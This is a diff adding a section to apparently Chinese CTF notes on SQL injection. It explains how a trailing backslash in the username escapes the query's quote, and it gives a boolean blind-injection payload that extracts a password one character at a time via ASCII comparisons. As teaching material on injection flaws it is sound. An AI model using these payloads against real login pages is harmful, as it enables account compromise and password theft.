@@ -34,3 +34,22 @@ prepare hello from @a;	//为上面set的sql语句取个别名
 execute hello;	//执行hello即执行设置的sql语句
 ```
 
+## 4.未过滤\
+
+select * from users where username='$_POST["username"]' and password='$_POST["password"]';
+
+若username=admin\
+
+输入的\会把$_POST["username"]后面的单引号转义失效，sql语句变成了
+
+```sql
+select username,password from user where username='admin\' and password=' or 1#'
+```
+
+这时可用盲注爆出密码
+
+username=admin\    password=or (ascii(substr(password,1,1))>65)#
+
+题目当语句正确和不正确是不一样的界面，循环判断第n位的数值
+
+比如第一位是O,ascii码为79，第一位大于65语句正确，接着判断地位大于66正确，直至第一位大于79吗，不大于，所以会出现与前面不一样的界面
